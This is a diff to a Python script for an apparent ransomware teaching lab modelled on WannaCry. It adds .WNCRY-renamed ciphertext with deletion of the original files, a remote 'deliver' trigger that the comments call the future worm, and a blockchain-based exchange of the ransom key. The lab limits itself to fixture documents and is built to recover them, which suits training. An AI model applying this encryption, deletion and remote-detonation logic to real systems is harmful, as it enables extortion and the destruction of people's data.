@@ -17,9 +17,11 @@ key material in plaintext on disk is ever needed by the chain itself.
 
 For the blockchain exchange, a separate ephemeral X25519 keypair is generated
 per request. The victim posts (ephemeral_pub, sealed victim_priv) on-chain;
-the attacker decrypts victim_priv offline and replies with victim_priv and the
-file key sealed under the ECDH shared key. This is a per-request channel, not a
-third persistent keypair. Ethereum wallet keys are unrelated to this module.
+the attacker decrypts victim_priv offline and replies with ONLY victim_priv,
+sealed under the ECDH shared key — the victim then unseals its own file key
+locally, so key material beyond victim_priv never travels. This is a
+per-request channel, not a third persistent keypair. Ethereum wallet keys are
+unrelated to this module.
 
 The scenario stays limited to the five exact generated fixture documents, as
 the rest of the lab does. It is a reversible lab demonstration, not a general
@@ -44,6 +46,10 @@ from file_generator import FILES
 
 SAMPLES = {name: text.encode("utf-8") for name, text in FILES.items()}
 MAGIC = b"Y04LAB1\n"
+# WannaCry fidelity: encrypted copies carry the .WNCRY extension and the
+# plaintext original is removed. Recovery restores the original name and
+# deletes the envelope.
+ENCRYPTED_SUFFIX = ".WNCRY"
 NONCE_SIZE = 12
 TAG_SIZE = 16
 RSA_BITS = 2048
@@ -240,12 +246,15 @@ def payload_exec(
     write_json(keylog_path, record, private=True)
 
     for name in SAMPLES:
+        # WannaCry fidelity: the ciphertext lands under <name>.WNCRY and the
+        # plaintext original is removed (renamed-away, not left behind).
         write_atomic(
-            target / name,
+            target / (name + ENCRYPTED_SUFFIX),
             MAGIC
             + unb64(record["files"][name]["nonce"])
             + unb64(record["files"][name]["ciphertext"]),
         )
+        (target / name).unlink(missing_ok=True)
     return record
 
 
@@ -283,6 +292,8 @@ def recover_samples(
         if digest != baseline.get(name):
             raise ValueError(f"recovered sample does not match its baseline: {name}")
         write_atomic(target / name, plain)
+        # Restore the original name by removing the ransomware envelope.
+        (target / (name + ENCRYPTED_SUFFIX)).unlink(missing_ok=True)
     print(f"{participant_id}: {len(SAMPLES)} documents recovered and verified")
 
 
@@ -337,11 +348,14 @@ def _ecdh_channel(own_priv_x25519, peer_pub_raw: bytes) -> bytes:
     ).derive(shared)
 
 
-def attacker_build_reply(request: dict, victim_priv_pem: bytes, file_key: bytes) -> dict:
-    """Attacker side: seal the recovered material to the victim's ephemeral key.
+def attacker_build_reply(request: dict, victim_priv_pem: bytes) -> dict:
+    """Attacker side: seal the recovered victim key to the victim's ephemeral key.
 
-    The reply is the on-chain payload that only the requesting victim host can
-    open, because only it holds the ephemeral private key from step one.
+    The reply carries ONLY victim_priv. The file key never travels: the
+    victim holds file_key_sealed locally and opens it with the recovered
+    victim key (victim_open_file_key). The reply is the on-chain payload that
+    only the requesting victim host can open, because only it holds the
+    ephemeral private key from step one.
     """
     ephemeral = x25519.X25519PrivateKey.generate()
     reply_key = _ecdh_channel(
@@ -352,10 +366,10 @@ def attacker_build_reply(request: dict, victim_priv_pem: bytes, file_key: bytes)
     )
     nonce = os.urandom(NONCE_SIZE)
     payload = json.dumps(
-        {"victim_priv_pem": victim_priv_pem.decode("ascii"), "file_key": b64(file_key)}
+        {"victim_priv_pem": victim_priv_pem.decode("ascii")}
     ).encode("utf-8")
     return {
-        "participant_id": request["participant_id"],
+        "participant_id": request.get("participant_id", ""),
         "reply_pub_b64": b64(reply_pub_raw),
         "nonce": b64(nonce),
         "ct": b64(AESGCM(reply_key).encrypt(nonce, payload, None)),
@@ -377,8 +391,14 @@ def save_exchange_request(keylog: dict, path: Path) -> dict:
     return request
 
 
-def victim_accept_reply(request_path: Path, reply: dict) -> dict:
-    """Victim side: open the attacker's reply with the saved ephemeral key."""
+def victim_accept_reply(request_path: Path, reply: dict, keylog: dict = None) -> dict:
+    """Victim side: open the attacker's reply with the saved ephemeral key.
+
+    The reply carries victim_priv. When the local keylog is provided (the
+    normal case), the file key is unsealed locally with the recovered victim
+    key — key material the attacker never needed to see. Replies that still
+    embed a file key (older manual-path format) are accepted unchanged.
+    """
     saved = json.loads(request_path.read_text(encoding="utf-8"))
     ephemeral = x25519.X25519PrivateKey.from_private_bytes(
         unb64(saved["ephemeral_priv_b64"])
@@ -386,9 +406,19 @@ def victim_accept_reply(request_path: Path, reply: dict) -> dict:
     channel = _ecdh_channel(ephemeral, unb64(reply["reply_pub_b64"]))
     payload = AESGCM(channel).decrypt(unb64(reply["nonce"]), unb64(reply["ct"]), None)
     opened = json.loads(payload)
+    if "file_key" in opened:
+        file_key = unb64(opened["file_key"])
+    elif keylog is not None:
+        file_key = victim_open_file_key(
+            opened["victim_priv_pem"].encode("ascii"), keylog
+        )
+    else:
+        raise ValueError(
+            "reply carries no file key and no local keylog was provided to derive it"
+        )
     return {
         "victim_priv_pem": opened["victim_priv_pem"].encode("ascii"),
-        "file_key": unb64(opened["file_key"]),
+        "file_key": file_key,
     }
 
 
@@ -416,13 +446,14 @@ def run_recovery_step(target: Path, state_file: Path, lab_dir: Path, password: s
         raise ValueError(
             "no keylog yet: run the payload first with "
             "python3 /opt/wannacry-v2/lab_keylogic.py payload "
-            "--target /home/seed/import_folder"
+            "--target /home/seed/import_folder "
+            "--attacker-pub /opt/wannacry-v2/attacker_pub.pem"
         )
     keylog = json.loads(keylog_path.read_text(encoding="utf-8"))
 
     if reply_path.exists():
         reply = json.loads(reply_path.read_text(encoding="utf-8"))
-        opened = victim_accept_reply(request_path, reply)
+        opened = victim_accept_reply(request_path, reply, keylog)
         write_json(accepted_path, {
             "victim_priv_pem_b64": b64(opened["victim_priv_pem"]),
             "file_key_b64": b64(opened["file_key"]),
@@ -475,7 +506,7 @@ def run_recovery_step(target: Path, state_file: Path, lab_dir: Path, password: s
             print("Falling back to the manual copy path. Current instructions:")
         else:
             reply = json.loads(reply_path.read_text(encoding="utf-8"))
-            opened = victim_accept_reply(request_path, reply)
+            opened = victim_accept_reply(request_path, reply, keylog)
             write_json(accepted_path, {
                 "victim_priv_pem_b64": b64(opened["victim_priv_pem"]),
                 "file_key_b64": b64(opened["file_key"]),
@@ -505,14 +536,19 @@ def main():
     parser.add_argument(
         "action",
         choices=[
-            "init-attacker", "payload", "request", "reply", "accept", "recover",
-            "watch", "withdraw",
+            "init-attacker", "deliver", "payload", "request", "reply", "accept",
+            "recover", "watch", "withdraw",
         ],
     )
     parser.add_argument("--target", type=Path, default=Path("/home/seed/import_folder"))
     parser.add_argument("--participant-id", default="as180-host_0")
     parser.add_argument("--keylog", type=Path, default=DEFAULT_KEYLOG)
     parser.add_argument("--attacker-keys", type=Path, default=DEFAULT_ATTACKER)
+    parser.add_argument(
+        "--attacker-pub", type=Path, default=None,
+        help="path to a dropped attacker_pub.pem (the worm's delivery); "
+             "falls back to --attacker-keys when omitted",
+    )
     parser.add_argument("--chain-key", type=Path, default=None,
                         help="attacker on-chain account JSON (private_key)")
     parser.add_argument("--rpc-url", default=None, help="attacker-side chain RPC")
@@ -522,18 +558,64 @@ def main():
                         default=Path("/opt/wannacry-v2/participant.json"))
     parser.add_argument("--in", dest="in_path", type=Path, default=None)
     parser.add_argument("--out", dest="out_path", type=Path, default=None)
+    parser.add_argument(
+        "--victim-url", type=str, default=None,
+        help="victim delivery inbox base URL, e.g. http://10.180.0.10:4450 "
+             "(used by the deliver action from the attacker machine)",
+    )
     args = parser.parse_args()
 
     if args.action == "init-attacker":
         create_attacker_keys(args.attacker_keys)
         return
 
-    if args.action == "payload":
+    if args.action == "deliver":
+        # The worm's delivery, played by hand: run this from the ATTACKER
+        # machine. It hands the attacker PUBLIC key to the victim host's
+        # delivery inbox, which drops it and detonates the payload there.
+        # When real propagation arrives, this action becomes the worm.
+        import urllib.error
+        from urllib.request import Request, urlopen
+
+        if not args.victim_url:
+            raise SystemExit(
+                "deliver needs --victim-url http://<victim-ip>:4450 "
+                "(the victim host's delivery inbox)"
+            )
         attacker_keys = json.loads(args.attacker_keys.read_text(encoding="utf-8"))
+        body = json.dumps(
+            {"attacker_pub_pem": attacker_keys["attacker_pub_pem"]}
+        ).encode("utf-8")
+        request = Request(
+            args.victim_url.rstrip("/") + "/drop",
+            data=body,
+            headers={"Content-Type": "application/json"},
+        )
+        try:
+            with urlopen(request, timeout=30) as response:
+                result = json.load(response)
+        except urllib.error.HTTPError as error:
+            result = json.load(error)
+        print(json.dumps(result, indent=2))
+        return
+
+    if args.action == "payload":
+        if args.attacker_pub is not None:
+            # The worm's drop: only the attacker's PUBLIC key is on this host.
+            attacker_pub_pem = args.attacker_pub.read_text(encoding="utf-8").encode("ascii")
+        elif args.attacker_keys.exists():
+            # Fallback for single-host labs: full attacker key file present.
+            attacker_keys = json.loads(args.attacker_keys.read_text(encoding="utf-8"))
+            attacker_pub_pem = attacker_keys["attacker_pub_pem"].encode("ascii")
+        else:
+            raise SystemExit(
+                "no attacker public key on this host: provide --attacker-pub "
+                "attacker_pub.pem (copied from the attacker machine)"
+            )
         payload_exec(
             args.target,
             args.participant_id,
-            attacker_keys["attacker_pub_pem"].encode("ascii"),
+            attacker_pub_pem,
             args.keylog,
         )
         print(f"payload executed; keylog: {args.keylog}")
@@ -544,7 +626,7 @@ def main():
         if not (args.chain_key and args.rpc_url and args.utility_url):
             raise SystemExit(
                 "watch needs --chain-key, --rpc-url, --utility-url "
-                "(plus --attacker-keys and --keylog for the offline crypto)"
+                "(plus --attacker-keys for the offline crypto)"
             )
         config = {
             "chain_id": 18000,
@@ -554,7 +636,7 @@ def main():
             "ransom_wei": args.ransom_wei,
         }
         results = lab_ransom_chain.attacker_watch(
-            config, args.attacker_keys, args.chain_key, args.keylog
+            config, args.attacker_keys, args.chain_key
         )
         print(json.dumps(results, indent=2) if results else "no unanswered requests")
         return
@@ -590,9 +672,8 @@ def main():
         victim_priv_pem = attacker_open_victim_priv(
             unb64(attacker_keys["attacker_priv_pem"]), keylog
         )
-        file_key = victim_open_file_key(victim_priv_pem, keylog)
         request = json.loads(args.in_path.read_text(encoding="utf-8"))
-        reply = attacker_build_reply(request, victim_priv_pem, file_key)
+        reply = attacker_build_reply(request, victim_priv_pem)
         print(json.dumps(reply, indent=2))
         return
 
@@ -600,8 +681,9 @@ def main():
         if not args.in_path or not args.out_path:
             raise SystemExit("accept needs --in reply.json and --out accepted.json")
         reply = json.loads(args.in_path.read_text(encoding="utf-8"))
+        keylog = json.loads(args.keylog.read_text(encoding="utf-8"))
         opened = victim_accept_reply(
-            args.keylog.parent / "exchange_request.json", reply
+            args.keylog.parent / "exchange_request.json", reply, keylog
         )
         write_json(args.out_path, {
             "victim_priv_pem_b64": b64(opened["victim_priv_pem"]),
